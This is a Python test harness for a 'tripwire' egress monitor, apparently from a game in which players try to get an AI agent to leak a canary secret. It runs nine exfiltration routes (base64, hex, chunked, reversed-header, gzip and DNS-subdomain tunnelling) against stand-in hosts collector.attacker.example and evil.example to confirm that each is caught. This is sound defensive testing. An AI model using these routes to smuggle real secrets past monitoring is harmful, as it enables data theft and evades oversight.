"""A dumb attacker with no model attached — the tripwire's test harness.

DEV.md §3/A1 is blunt about the order of work: the tripwire is the scoring
bedrock and gets built and proven *before* any real agent exists. This is what
proves it. It reads the canary and tries to smuggle it out every way a player
plausibly might, then reports which attempts the tripwire caught.

Every route must be caught. A miss here is a false negative at the booth: a
player wins and the board shows nothing.

    python3 -m tripwire.fake_agent --self-test

spins up the proxy and the DNS guard, runs every route, prints a table and exits
non-zero on any miss. That single command is DEV.md §7's checklist items 3 and 4.
"""

from __future__ import annotations

import argparse
import base64
import gzip
import json
import socket
import struct
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Callable

from .canary import Canary
from .events import EventLog
from .inspect import EgressMonitor

COLLECTOR_HOST = "collector.attacker.example"
DNS_ZONE = "evil.example"
DNS_LABEL_MAX = 63


@dataclass
class Context:
    canary: Canary
    proxy_url: str | None = None
    dns_addr: tuple[str, int] | None = None

    def target(self, route: str) -> str:
        return f"http://{COLLECTOR_HOST}/collect/{route}"


def _send(ctx: Context, route: str, *, query: str = "", body: bytes | None = None,
          headers: dict[str, str] | None = None) -> None:
    """Fire one request at the collector through the proxy.

    A blocked request comes back as an HTTP error, which from the attacker's
    point of view is failure and from ours is success. Either way we do not care
    about the response — the event log is the record.
    """
    url = ctx.target(route) + (f"?{query}" if query else "")
    req = urllib.request.Request(url, data=body, headers=headers or {},
                                 method="POST" if body else "GET")
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({"http": ctx.proxy_url} if ctx.proxy_url else {})
    )
    try:
        opener.open(req, timeout=10).read()
    except (urllib.error.URLError, OSError):
        pass


def _dns_query(qname: str) -> bytes:
    header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    labels = b"".join(
        bytes([len(part)]) + part.encode("latin-1") for part in qname.split(".")
    )
    return header + labels + b"\x00" + struct.pack("!HH", 1, 1)


def _resolve(ctx: Context, qname: str) -> None:
    if not ctx.dns_addr:
        return
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(3)
            sock.sendto(_dns_query(qname), ctx.dns_addr)
            sock.recv(4096)
    except OSError:
        pass


# --- the routes --------------------------------------------------------------


def route_plain(ctx: Context) -> None:
    """The naive one. Straight into a POST body."""
    _send(ctx, "plain", body=ctx.canary.token.encode())


def route_base64(ctx: Context) -> None:
    """The first thing anyone tries once plaintext stops working."""
    blob = base64.b64encode(ctx.canary.token.encode()).decode()
    _send(ctx, "base64", query=urllib.parse.urlencode({"d": blob}))


def route_hex(ctx: Context) -> None:
    """Hex inside a JSON body, which is what a shell one-liner produces."""
    body = json.dumps({"backup": ctx.canary.token.encode().hex()}).encode()
    _send(ctx, "hex", body=body, headers={"Content-Type": "application/json"})


def route_url_encoded(ctx: Context) -> None:
    """Percent-encoded in a query string."""
    _send(ctx, "urlenc", query="k=" + urllib.parse.quote(ctx.canary.token, safe=""))


def route_dns_subdomain(ctx: Context) -> None:
    """The bypass from DEV.md §0 — DNS never touches HTTP_PROXY."""
    blob = base64.b32encode(ctx.canary.token.encode()).decode().rstrip("=").lower()
    labels = [blob[i : i + DNS_LABEL_MAX] for i in range(0, len(blob), DNS_LABEL_MAX)]
    _resolve(ctx, ".".join(labels) + "." + DNS_ZONE)


def route_chunked(ctx: Context) -> None:
    """Eight characters at a time, so no single request holds the secret."""
    token = ctx.canary.token
    for i in range(0, len(token), 8):
        _send(ctx, "chunk",
              query=urllib.parse.urlencode({"seq": i // 8, "d": token[i : i + 8]}))


def route_reversed_header(ctx: Context) -> None:
    """Backwards, in a custom header, where nobody looks."""
    _send(ctx, "revhdr", headers={"X-Trace-Id": ctx.canary.token[::-1]})


def route_gzip_base64(ctx: Context) -> None:
    """Compressed then encoded — two layers to peel."""
    blob = base64.b64encode(gzip.compress(ctx.canary.token.encode())).decode()
    _send(ctx, "gzb64", body=blob.encode())


def route_dns_hex_labels(ctx: Context) -> None:
    """Hex core spread over several DNS labels, four characters each."""
    core = ctx.canary.core
    labels = [core[i : i + 4] for i in range(0, len(core), 4)]
    _resolve(ctx, ".".join(labels) + "." + DNS_ZONE)


ROUTES: list[tuple[str, Callable[[Context], None]]] = [
    ("plain", route_plain),
    ("base64", route_base64),
    ("hex", route_hex),
    ("url_encoded", route_url_encoded),
    ("dns_subdomain", route_dns_subdomain),
    ("chunked", route_chunked),
    ("reversed_header", route_reversed_header),
    ("gzip_base64", route_gzip_base64),
    ("dns_hex_labels", route_dns_hex_labels),
]

# The five DEV.md §7 names outright. The rest are extra credit, but they are held
# to the same standard: if one of them can slip past, so can a player.
REQUIRED = {"plain", "base64", "hex", "url_encoded", "dns_subdomain"}


def run_route(name: str, fn: Callable[[Context], None], canary: Canary,
              *, log_path: str | None = None) -> bool:
    """Run one route against its own private monitor. Returns True if caught.

    A monitor per route, not one shared across all of them, so a hit can only be
    attributed to the route that actually caused it — the stream assembler
    remembers past traffic by design, and sharing it would let an earlier route
    take credit for a later one's miss.
    """
    from .localproxy import InterceptProxy
    from .dnsguard import DNSGuard

    monitor = EgressMonitor(
        canary, EventLog(log_path or "/dev/null"),
        allow_hosts=[], sealed=True, log_allowed=False,
    )
    proxy = InterceptProxy(monitor).start()
    dns = DNSGuard(monitor, upstream=None).start()
    try:
        fn(Context(canary=canary, proxy_url=proxy.url, dns_addr=(dns.host, dns.port)))
    finally:
        proxy.stop()
        dns.stop()
    return monitor.first_detection is not None


def self_test(verbose: bool = True) -> int:
    canary = Canary.generate()
    if verbose:
        print(f"canary for this run: {canary.token}\n")
    missed = []
    for name, fn in ROUTES:
        caught = run_route(name, fn, canary)
        if not caught:
            missed.append(name)
        if verbose:
            mark = "caught " if caught else "MISSED!"
            required = " (required)" if name in REQUIRED else ""
            print(f"  {mark}  {name}{required}")
    if verbose:
        print()
        if missed:
            print(f"FAIL — {len(missed)} route(s) slipped past: {', '.join(missed)}")
            print("A miss here is a player winning with nothing on the board.")
        else:
            print(f"PASS — all {len(ROUTES)} exfil routes caught and blocked.")
    return 1 if missed else 0


def main() -> int:
    ap = argparse.ArgumentParser(description="tripwire test attacker (no model)")
    ap.add_argument("--self-test", action="store_true",
                    help="spin up the tripwire locally and check every route")
    ap.add_argument("--proxy", help="existing proxy URL to attack through")
    ap.add_argument("--dns", help="existing DNS guard as host:port")
    ap.add_argument("--canary-file", help="read the canary from this file")
    ap.add_argument("--canary", help="canary token as a literal")
    ap.add_argument("--route", action="append", default=[],
                    help="run only these routes (default: all)")
    args = ap.parse_args()

    if args.self_test or not (args.proxy or args.dns):
        return self_test()

    if args.canary:
        canary = Canary.from_token(args.canary)
    elif args.canary_file:
        with open(args.canary_file, encoding="utf-8", errors="replace") as fh:
            token = next(
                (ln.strip() for ln in fh if ln.strip().startswith(Canary.generate().prefix)),
                "",
            )
        canary = Canary.from_token(token)
    else:
        ap.error("need --canary or --canary-file when attacking an existing proxy")

    dns_addr = None
    if args.dns:
        host, _, port = args.dns.partition(":")
        dns_addr = (host, int(port or 53))
    ctx = Context(canary=canary, proxy_url=args.proxy, dns_addr=dns_addr)

    wanted = set(args.route) if args.route else None
    for name, fn in ROUTES:
        if wanted and name not in wanted:
            continue
        print(f"  attempting {name}")
        fn(ctx)
    print("done — check the event log for what the tripwire saw")
    return 0


if __name__ == "__main__":
    sys.exit(main())
